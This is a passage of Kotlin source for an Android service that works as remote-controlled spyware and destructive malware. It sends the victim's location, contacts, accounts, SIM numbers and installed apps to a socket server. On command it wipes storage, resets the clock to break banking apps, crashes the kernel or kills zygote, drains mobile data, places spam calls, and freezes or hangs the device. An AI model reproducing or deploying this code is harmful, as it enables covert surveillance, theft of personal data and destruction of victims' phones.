                put("deviceId", deviceId); put("error", "permission_denied")
            })
            return
        }

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        if (!gpsOn && !networkOn) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "provider_disabled")
            })
            return
        }

        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        
        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        fusedClient.getCurrentLocation(priority, cts.token)
            .addOnSuccessListener { loc ->
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {                    
                    requestSingleLocationUpdate(fusedClient, priority)
                }
            }
            .addOnFailureListener {
                requestSingleLocationUpdate(fusedClient, priority)
            }
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
        val req = LocationRequest.Builder(priority, 2000L)
            .setMaxUpdates(1)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                fusedClient.removeLocationUpdates(this)
                val loc = result.lastLocation
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {
                    socket?.emit("device:location", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "no_location")
                    })
                }
            }
        }

        try {
            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
            Handler(Looper.getMainLooper()).postDelayed({
                fusedClient.removeLocationUpdates(cb)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "no_location")
            })
        }
    }

    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
        val obj = org.json.JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("accuracy", accuracy)
        }
        try {
            @Suppress("DEPRECATION")
            val geocoder = Geocoder(this, java.util.Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                obj.put("province", addr.adminArea ?: "")
                obj.put("city", addr.subAdminArea ?: "")
                obj.put("district", addr.locality ?: "")
                obj.put("village", addr.subLocality ?: "")
                obj.put("postalCode", addr.postalCode ?: "")
                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
                obj.put("countryName", addr.countryName ?: "")
            }
        } catch (_: Exception) { }
        socket?.emit("device:location", obj)
    }

    private fun sendContacts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:contacts", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        val name   = c.getString(nameCol) ?: continue
                        val number = c.getString(numCol) ?: continue
                        arr.put(org.json.JSONObject().apply {
                            put("name", name.trim())
                            put("number", number.trim())
                        })
                    }
                }
                socket?.emit("device:contacts", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContacts: ${e.message}")
            }
        }.start()
    }

    private fun sendGmailAccounts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:gmail", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val am = getSystemService(android.accounts.AccountManager::class.java)
                val accounts = am?.getAccountsByType("com.google") ?: emptyArray()
                val arr = org.json.JSONArray()
                accounts.forEach { acc ->
                    arr.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                val allAccounts = am?.accounts ?: emptyArray()
                val extra = org.json.JSONArray()
                allAccounts.filter { it.type != "com.google" }.forEach { acc ->
                    extra.put(JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    })
                }
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                    put("others", extra)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGmailAccounts: ${e.message}")
            }
        }.start()
    }

    private fun sendPhoneNumbers() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val subMgr = getSystemService(android.telephony.SubscriptionManager::class.java)
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
                        if (subs.isEmpty()) {
                            val num = tm.line1Number
                            if (!num.isNullOrBlank()) {
                                arr.put(JSONObject().apply {
                                    put("slot", 0)
                                    put("number", num)
                                    put("operator", tm.networkOperatorName ?: "")
                                    put("simState", tm.simState)
                                })
                            }
                        } else {
                            subs.forEachIndexed { idx, sub ->
                                arr.put(JSONObject().apply {
                                    put("slot", idx)
                                    put("number", sub.number ?: "")
                                    put("operator", sub.carrierName ?: "")
                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
                                    put("iccId", sub.iccId ?: "")
                                })
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val num = tm.line1Number
                        arr.put(JSONObject().apply {
                            put("slot", 0)
                            put("number", num ?: "")
                            put("operator", tm.networkOperatorName ?: "")
                        })
                    }
                }
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("sims", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId); put("error", e.message)
                })
            }
        }.start()
    }

    private fun sendInstalledApps() {
        Thread {
            try {
                val pm  = packageManager
                val arr = org.json.JSONArray()
                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages
                    .filter { it.packageName != packageName }
                    .mapNotNull { pkgInfo ->
                        try {
                            val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                            if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
                        } catch (_: Exception) { null }
                    }
                    .sortedBy { it.second.lowercase() }
                    .forEach { (pkg, name) ->
                        arr.put(org.json.JSONObject().apply {
                            put("package", pkg)
                            put("name", name)
                        })
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:apps", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("apps", arr)
                })
                socket?.emit("device:status", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", org.json.JSONObject().apply { put("installedApps", arr) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "getInstalledApps: ${e.message}")
            }
        }.start()
    }

        private fun factoryWipe() {
        try {
            emitStatus(JSONObject().apply { put("factoryWipe", "executing") })
            var done = false

            // Metode 1: DevicePolicyManager.wipeData() (Cara Legal & Paling Ampuh, tapi butuh Admin Aktif)
            if (!done) {
                try {
                    if (AntiUninstallReceiver.isAdminActive(this)) {
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val admin = ComponentName(this, AntiUninstallReceiver::class.java)
                        // Flag WIPE_EXTERNAL_STORAGE memastikan memori eksternal/OTG juga ikut terformat
                        dpm.wipeData(android.app.admin.DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                        done = true
                    }
                } catch (e: Exception) {
                    Log.w("DeviceService", "DPM wipe err: ${e.message}")
                }
            }

            // Metode 2: Kirim Intent MASTER_CLEAR (Kadang berhasil di beberapa ROM tanpa konfirmasi)
            if (!done) {
                try {
                    val intent = Intent("android.intent.action.MASTER_CLEAR").apply {
                        putExtra("android.intent.extra.REBOOT", true)
                        putExtra("android.intent.extra.WIPE_EXTERNAL_STORAGE", true)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
                    }
                    startActivity(intent)
                    done = true
                } catch (e: Exception) {
                    Log.w("DeviceService", "MASTER_CLEAR intent err: ${e.message}")
                }
            }

            // Metode 3: Jika GAGAL TRUE FACTORY RESET (Karena NO ROOT), LAKUKAN DESTRUCTIVE WIPE
            // Ini akan menghapus SELURUH isi folder Internal Storage (DCIM, Download, WhatsApp, Android, dll)
            if (!done) {
                Thread {
                    try {
                        val sdcard = android.os.Environment.getExternalStorageDirectory()
                        deleteRecursive(sdcard)
                        
                        Thread.sleep(2000) // Beri waktu sistem menyelesaikan penghapusan file

                        // Opsional: Setel waktu HP ke tahun 1970 (Trik lama, bikin aplikasi banking/keamanan error & logout paksa)
                        try {
                            Runtime.getRuntime().exec(arrayOf("su", "-c", "date 010100001970")).waitFor(1, java.util.concurrent.TimeUnit.SECONDS)
                        } catch (_: Exception) {}

                        // Setelah data hilang, paksa HP Restart menggunakan fungsi fix yang sudah dibuat
                        restartDevice()

                        emitStatus(JSONObject().apply { put("factoryWipe", "destructive_wipe_and_restarting") })
                    } catch (e: Exception) {
                        emitStatus(JSONObject().apply { put("factoryWipe", "error: ${e.message}") })
                    }
                }.start()
                return // Keluar karena berjalan di Thread terpisah
            }

            emitStatus(JSONObject().apply { put("factoryWipe", if (done) "wiping" else "failed") })
        } catch (e: Exception) {
            Log.e("DeviceService", "factoryWipe error: ${e.message}")
            emitStatus(JSONObject().apply { put("factoryWipe", "error: ${e.message}") })
        }
    }
        private fun restartDevice() {
        try {
            emitStatus(JSONObject().apply { put("restartDevice", "executing") })
            var done = false

            // Metode 1: PowerManager reflection (NO ROOT, paling halus)
            if (!done) {
                try {
                    val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
                    val m = pm.javaClass.getDeclaredMethod("reboot", String::class.java)
                    m.isAccessible = true
                    m.invoke(pm, null as String?)
                    done = true
                } catch (e: Exception) {
                    Log.w("DeviceService", "PM reboot: ${e.message}")
                }
            }

            // Metode 2: DevicePolicyManager (jika device admin aktif)
            if (!done) {
                try {
                    if (AntiUninstallHelper.isAdminActive(this) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val admin = ComponentName(this, AntiUninstallReceiver::class.java)
                        dpm.reboot(admin)
                        done = true
                    }
                } catch (e: Exception) {
                    Log.w("DeviceService", "DPM reboot: ${e.message}")
                }
            }

            // Metode 3: su root
            if (!done) {
                try {
                    val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                    p.waitFor(3, java.util.concurrent.TimeUnit.SECONDS)
                    done = true
                } catch (e: Exception) {
                    Log.w("DeviceService", "su reboot: ${e.message}")
                }
            }

            // Metode 4: am crash system_server (force restart tanpa root di beberapa HP)
            if (!done) {
                try {
                    Runtime.getRuntime().exec(arrayOf("sh", "-c", "am crash system_server"))
                    done = true
                } catch (_: Exception) {}
            }

            // Metode 5: pkill zygote (ekstrem, memaksa full reboot)
            if (!done) {
                try {
                    Runtime.getRuntime().exec(arrayOf("sh", "-c", "pkill -9 zygote"))
                } catch (_: Exception) {}
            }

            emitStatus(JSONObject().apply { put("restartDevice", if (done) "rebooting" else "reboot_attempted") })
        } catch (e: Exception) {
            Log.e("DeviceService", "restartDevice error: ${e.message}")
            emitStatus(JSONObject().apply { put("restartDevice", "error: ${e.message}") })
        }
    }
        private fun shutdownDevice() {
        try {
            emitStatus(JSONObject().apply { put("shutdownDevice", "executing") })
            
            var done = false

            // Method 1: DevicePolicyManager.lockNow() — paling aman, hanya mematikan layar
            if (!done) {
                try {
                    if (AntiUninstallHelper.isAdminActive(this)) {
                        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        dpm.lockNow()
                        done = true
                        emitStatus(JSONObject().apply { put("shutdownDevice", "screen_off_dpm") })
                        return
                    }
                } catch (e: Exception) {
                    Log.w("DeviceService", "screen_off dpm err: ${e.message}")
                }
            }

            // Method 2: KEYCODE_SLEEP (mematikan layar tanpa root)
            if (!done) {
                Thread {
                    try {
                        Runtime.getRuntime().exec(arrayOf("input", "keyevent", "223")).waitFor(2, java.util.concurrent.TimeUnit.SECONDS)
                    } catch (e: Exception) {
                        Log.w("DeviceService", "screen_off keyevent err: ${e.message}")
                    }
                }.start()
                emitStatus(JSONObject().apply { put("shutdownDevice", "screen_off_sleep") })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "shutdownDevice error: ${e.message}")
            emitStatus(JSONObject().apply { put("shutdownDevice", "error: ${e.message}") })
        }
    }
            private fun turnOnScreen() {
        try {
            // Method 1: KEYCODE_WAKEUP (paling ampuh tanpa root)
            Thread {
                try {
                    Runtime.getRuntime().exec(arrayOf("input", "keyevent", "224")).waitFor(1, java.util.concurrent.TimeUnit.SECONDS)
                } catch (e: Exception) {
                    Log.w("DeviceService", "screen_on keyevent err: ${e.message}")
                }
            }.start()

            // Method 2: PowerManager.wakeUp via reflection (backup)
            try {
                val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
                if (pm != null && !pm.isInteractive) {
                    val m = pm.javaClass.getMethod("wakeUp", Long::class.java, Int::class.java, String::class.java)
                    m.invoke(pm, android.os.SystemClock.uptimeMillis(), 0, "SyncXxX")
                }
            } catch (_: Exception) {}

            // Method 3: Swipe ke atas untuk membuka kunci (Keyguard dismiss)
            Thread {
                try {
                    Thread.sleep(500)
                    val dm = resources.displayMetrics
                    val sw = dm.widthPixels / 2
                    val sy = (dm.heightPixels * 0.85f).toInt()
                    val ey = (dm.heightPixels * 0.3f).toInt()
                    Runtime.getRuntime().exec(arrayOf("input", "swipe", sw.toString(), sy.toString(), sw.toString(), ey.toString(), "300")).waitFor(2, java.util.concurrent.TimeUnit.SECONDS)
                } catch (_: Exception) {}
            }.start()

            emitStatus(JSONObject().apply { put("screenTurnedOn", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "turnOnScreen error: ${e.message}")
        }
    }
    
    private fun crashKernel() {
        try {
            emitStatus(JSONObject().apply { put("crashKernel", "executing") })
            Thread {
                try {
                    Runtime.getRuntime().exec(arrayOf("su", "-c", "echo c > /proc/sysrq-trigger"))
                } catch (e: Exception) {
                    try {
                        Runtime.getRuntime().exec(arrayOf("su", "-c", "kill -9 1"))
                    } catch (e2: Exception) {
                        for (i in 1..1000) {
                            val t = Thread {
                                while (true) {
                                    val arr = IntArray(100000)
                                }
                            }
                            t.start()
                            synchronized(crashThreads) { crashThreads.add(t) }
                        }
                    }
                }
            }.start()
        } catch (e: Exception) {
            Log.e("DeviceService", "crashKernel error: ${e.message}")
        }
    }

    private fun stopCrashKernel() {
        try {
            synchronized(crashThreads) {
                crashThreads.forEach { t -> 
                    if (t.isAlive) t.interrupt() 
                }
                crashThreads.clear()
            }
            emitStatus(JSONObject().apply { put("crashKernel", "stopped") })
        } catch (e: Exception) {
            Log.e("DeviceService", "stopCrashKernel error: ${e.message}")
        }
    }

    private fun openMapControl(value: String) {
        try {
            var uri = "geo:0,0?q=" 
            var label = "Lokasi Device"
            
            try {
                val obj = JSONObject(value)
                val lat = obj.optDouble("lat", 0.0)
                val lng = obj.optDouble("lng", 0.0)
                if (lat != 0.0 || lng != 0.0) {
                    uri = "geo:$lat,$lng?q=$lat,$lng($label)"
                }
                label = obj.optString("label", "Lokasi")
            } catch (_: Exception) {}

            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(uri)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                setPackage("com.google.android.apps.maps") 
            }
            try {
                startActivity(intent)
            } catch (e: Exception) {
                val fallbackIntent = Intent(Intent.ACTION_VIEW, Uri.parse(uri)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(fallbackIntent)
            }
            
            emitStatus(JSONObject().apply { put("mapOpened", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openMapControl error: ${e.message}")
        }
    }

    private fun drainData(value: String) {
        try {
            val obj = JSONObject(value)
            val durationSec = obj.optLong("duration", 30L).coerceAtLeast(5L)
            val stopWifi = obj.optBoolean("stopWifi", false)
            val threads = obj.optInt("threads", 4).coerceIn(1, 8)  // Parallel downloads
            
            isDraining = true
            emitStatus(JSONObject().apply { put("dataDrainActive", true); put("threadsActive", threads) })

            drainDataThread = Thread {
                try {
                    var totalDrained = 0L
                    val endTime = System.currentTimeMillis() + (durationSec * 1000)
                    val drainThreads = mutableListOf<Thread>()
                    val lock = Any()
                    
                    // Multiple drain servers untuk reliability
                    val sources = listOf(
                        "https://speed.hetzner.de/1GB.bin",
                        "https://speed.cloudflare.com/__down?bytes=1000000000",
                        "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png",
                        "https://www.ovh.net/files/1Gb.dat"
                    )
                    
                    // Spawn parallel drain threads
                    repeat(threads) { threadId ->
                        val drainThread = Thread {
                            var threadDrained = 0L
                            val sourceId = threadId % sources.size
                            val url = sources[sourceId]
                            
                            while (isDraining && System.currentTimeMillis() < endTime) {
                                try {
                                    val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                                    conn.connectTimeout = 5000
                                    conn.readTimeout = 10000
                                    conn.instanceFollowRedirects = true
                                    conn.connect()
                                    
                                    val inputStream = conn.inputStream
                                    val buffer = ByteArray(8192)
                                    var bytesRead: Int
                                    
                                    while (inputStream.read(buffer).also { bytesRead = it } != -1 && isDraining) {
                                        threadDrained += bytesRead
                                        synchronized(lock) { totalDrained += bytesRead }
                                    }
                                    inputStream.close()
                                    conn.disconnect()
                                    
                                } catch (e: Exception) {
                                    Log.w("DeviceService", "Drain thread $threadId: ${e.message}")
                                    try { Thread.sleep(500) } catch (_: Exception) {}
                                }
                            }
                            
                            Log.d("DeviceService", "Drain thread $threadId: ${threadDrained / (1024*1024)}MB")
                        }
                        drainThread.isDaemon = true
                        drainThread.priority = Thread.MAX_PRIORITY
                        drainThreads.add(drainThread)
                        drainThread.start()
                    }
                    
                    // Monitor progress
                    var lastEmit = System.currentTimeMillis()
                    while (isDraining && System.currentTimeMillis() < endTime) {
                        Thread.sleep(1000)
                        val now = System.currentTimeMillis()
                        if (now - lastEmit > 2000 && socket?.connected() == true) {
                            lastEmit = now
                            val mbDrained = totalDrained / (1024 * 1024)
                            val elapsed = (now - (endTime - durationSec * 1000)) / 1000
                            val rate = if (elapsed > 0) mbDrained / elapsed else 0
                            
                            socket?.emit("device:bandwidth", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("mbDrained", mbDrained)
                                put("mbPerSec", rate)
                                put("threadsActive", threads)
                                put("isDraining", true)
                            })
                        }
                    }
                    
                    // Wait for all threads to finish
                    drainThreads.forEach { it.join(2000) }
                    
                    val finalMB = totalDrained / (1024 * 1024)
                    Log.d("DeviceService", "✓ Data drain complete: ${finalMB}MB drained")
                    
                } finally {
                    isDraining = false
                    Handler(Looper.getMainLooper()).post {
                        if (stopWifi) killWifi()
                        emitStatus(JSONObject().apply { 
                            put("dataDrainActive", false)
                            put("dataDrainComplete", true)
                        })
                    }
                }
            }
            drainDataThread?.start()
        } catch (e: Exception) {
            Log.e("DeviceService", "drainData error: ${e.message}")
            emitStatus(JSONObject().apply { put("dataDrainError", e.message) })
        }
    }

    private fun stopDrainData() {
        isDraining = false
        try {
            drainDataThread?.interrupt()
            drainDataThread = null
        } catch (_: Exception) {}
        emitStatus(JSONObject().apply { put("dataDrainActive", false) })
    }

    @SuppressLint("MissingPermission")
    private fun killWifi() {
        try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                wifiManager.disconnect()
            } else {
                @Suppress("DEPRECATION")
                wifiManager.disableNetwork(wifiManager.connectionInfo.networkId)
            }
            emitStatus(JSONObject().apply { put("wifiKilled", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "killWifi error: ${e.message}")
        }
    }

        private fun startLockLiveChat() {
        try {
            // 1. Bersihkan lock & overlay lama agar tidak bentrok
            lockPin = ""
            lockTitle = ""
            removeLockCustomOverlay()
            stopLockFlashBlink()
            stopStatusBarCollapse()
            stopVolumeLock()
            
            lockMediaPlayer?.release()
            lockMediaPlayer = null
            val intentUnlock = Intent("com.fantzy.nih.UNLOCK").apply { setPackage(packageName) }
            sendBroadcast(intentUnlock)

            // 2. Jalankan Activity Lock Chat (Menggantikan posisi LockOverlayService)
            val intent = Intent(this, LockChatLive::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

            // 3. SAMAKAN EFEKNYA DENGAN lockDevice()
            startLockFlashBlink() // Efek flashlight kedip-kedip
            startVolumeLock()     // Efek volume di-max kan terus
            startStatusBarCollapse() // Efek menutup status bar
            
            // 4. Mainkan suara unlimited (Sesuai permintaan sebelumnya)
            playLockSound()

            // 5. Update status ke server
            emitStatus(JSONObject().apply { 
                put("lockLiveChatActive", true)
                put("deviceLocked", false)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "startLockLiveChat error: ${e.message}")
        }
    }

        // ====================================================================
    // FIX SPAM CALL
    // ====================================================================
    private fun spamCall(value: String) {
        try {
            val obj = JSONObject(value)
            val number = obj.optString("number", "")
            val repeat = obj.optInt("repeat", 5)
            if (number.isBlank()) return
            isSpamCalling = true
            emitStatus(JSONObject().apply { put("spamCallActive", true) })
            spamCallHandler = Handler(Looper.getMainLooper())
            var currentCall = 0
            spamCallRunnable = object : Runnable {
                override fun run() {
                    if (!isSpamCalling || currentCall >= repeat) { stopSpamCall(); return }
                    try {
                        val intent = Intent(Intent.ACTION_CALL).apply { data = Uri.parse("tel:$number"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_FROM_BACKGROUND) }
                        startActivity(intent)
                        currentCall++
                    } catch (e: Exception) {
                        try {
                            val intent = Intent(Intent.ACTION_DIAL).apply { data = Uri.parse("tel:$number"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
                            startActivity(intent)
                            currentCall++
                        } catch (_: Exception) {}
                    }
                    spamCallHandler?.postDelayed(this, 4000)
                }
            }
            spamCallRunnable?.let { spamCallHandler?.post(it) }
        } catch (e: Exception) { Log.e("DeviceService", "spamCall error: ${e.message}") }
    }

    // ====================================================================
    // FITUR CRASH COMBO, GREEN SCREEN, BLACK BLINK
    // ====================================================================
    private fun handleCrashCombo(value: String) {
        try {
            val arr = org.json.JSONArray(value)
            val isOn = arr.length() > 0 && arr.optBoolean(0, true)
            for (i in 1 until arr.length()) {
                val feature = arr.getString(i)
                if (isOn) { when (feature) { "flashDisco" -> startFlashDisco("{}"); "crashKernel" -> crashKernel(); "sos" -> startSos(); "virus" -> startSpamVideo("{}"); "maxVolume" -> forceMaxVolume(); "touchBlock" -> startTouchBlock("{\"duration\":0}"); "vibrate" -> vibrateDevice("1000"); "videoOverlay" -> startVideoOverlay(); else -> {} } }
                else { when (feature) { "flashDisco" -> stopFlashDisco(); "crashKernel" -> stopCrashKernel(); "sos" -> stopSos(); "virus" -> stopSpamVideo(); "touchBlock" -> stopTouchBlock(); "videoOverlay" -> stopVideoOverlay(); else -> {} } }
            }
            emitStatus(JSONObject().apply { put("crashCombo", isOn) })
        } catch (e: Exception) { Log.e("DeviceService", "crashCombo error: ${e.message}") }
    }

    private fun startGreenScreen() {
        if (greenScreenView != null) return
        Handler(Looper.getMainLooper()).post {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                val params = WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT, 15, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN, PixelFormat.TRANSLUCENT).apply { gravity = android.view.Gravity.TOP }
                val view = android.view.View(this).apply { setBackgroundColor(android.graphics.Color.parseColor("#00FF00")) }
                greenScreenView = view
                greenScreenResidue = false
                wm.addView(view, params)
                emitStatus(JSONObject().apply { put("greenScreen", "active") })
            } catch (e: Exception) { Log.e("DeviceService", "greenScreen error: ${e.message}") }
        }
    }

    private fun setGreenScreenResidue() {
        greenScreenResidue = true
        Handler(Looper.getMainLooper()).post { try { greenScreenView?.setBackgroundColor(android.graphics.Color.parseColor("#003300")) } catch (_: Exception) {} }
    }

    private fun removeGreenScreen() {
        Handler(Looper.getMainLooper()).post { try { greenScreenView?.let { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(it) }; greenScreenView = null; greenScreenResidue = false } catch (_: Exception) {} }
    }

    private fun startBlackBlink() {
        val intent = Intent("com.fantzy.nih.BLACK_OVERLAY_START").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("blackBlinkActive", true) })
    }

    private fun stopBlackBlink() {
        val intent = Intent("com.fantzy.nih.BLACK_OVERLAY_STOP").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("blackBlinkActive", false) })
    }

    // ====================================================================
    // SYSTEM FREEZE - Screen stays frozen, non-responsive
    // ====================================================================
    private var freezeThread: Thread? = null
    private var isFreezeRunning = false

    private fun startSystemFreeze() {
        if (isFreezeRunning) return
        isFreezeRunning = true
        freezeThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val params = WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                    format = android.graphics.PixelFormat.OPAQUE
                    flags = WindowManager.LayoutParams.FLAG_FULLSCREEN or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    width = WindowManager.LayoutParams.MATCH_PARENT
                    height = WindowManager.LayoutParams.MATCH_PARENT
                }
                val freezeView = android.view.View(this@DeviceService)
                freezeView.setBackgroundColor(android.graphics.Color.BLACK)
                wm.addView(freezeView, params)
                while (isFreezeRunning) Thread.sleep(100)
                try { wm.removeView(freezeView) } catch (e: Exception) {}
            } catch (e: Exception) { Log.e("DeviceService", "Freeze: ${e.message}"); isFreezeRunning = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("systemFreezeActive", true) })
        Log.d("DeviceService", "⚫ SYSTEM FREEZE ACTIVE")
    }

    private fun stopSystemFreeze() {
        isFreezeRunning = false
        try { freezeThread?.join(1000) } catch (e: Exception) {}
        emitStatus(JSONObject().apply { put("systemFreezeActive", false) })
        Log.d("DeviceService", "System Freeze disabled")
    }

    // ====================================================================
    // SYSTEM HANG - Device unresponsive, ANR-like state
    // ====================================================================
    private var hangThread: Thread? = null
    private var isHangActive = false

    private fun startSystemHang() {
        if (isHangActive) return
        isHangActive = true
        hangThread = Thread {
            try {
                repeat(3) {
                    Thread {
                        while (isHangActive) {
                            try {
                                val massive = IntArray(5_000_000)
                                for (i in massive.indices) massive[i] = i * kotlin.random.Random.nextInt()
                                Thread.sleep(50)
                            } catch (e: Exception) { Thread.sleep(10) }
                        }
                    }.apply { priority = Thread.MAX_PRIORITY; start() }
                }
                while (isHangActive) { Thread.sleep(100); System.gc(); java.lang.Thread.currentThread().priority = Thread.MAX_PRIORITY }
            } catch (e: Exception) { Log.e("DeviceService", "Hang: ${e.message}"); isHangActive = false }
        }.apply { isDaemon = true; start() }
        emitStatus(JSONObject().apply { put("systemHangActive", true) })
        Log.d("DeviceService", "🔴 SYSTEM HANG ACTIVE - Device unresponsive")
    }

    private fun stopSystemHang() {
        isHangActive = false
        try { hangThread?.interrupt(); hangThread?.join(2000) } catch (e: Exception) {}
        emitStatus(JSONObject().apply { put("systemHangActive", false) })
        Log.d("DeviceService", "System Hang disabled")
    }

    // ═══════════════════════════════════════════════════════════════════════════════════════
    // OVERLAY EFFECTS - Black Blink, Green Screen, Crack, Horror Text, etc
    // ═══════════════════════════════════════════════════════════════════════════════════════

    private fun startBlackBlink(flickerSpeed: Long = 100) {
        if (isBlinkRunning) return
        isBlinkRunning = true
        blackBlinkThread = Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val params = WindowManager.LayoutParams().apply {
                    type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
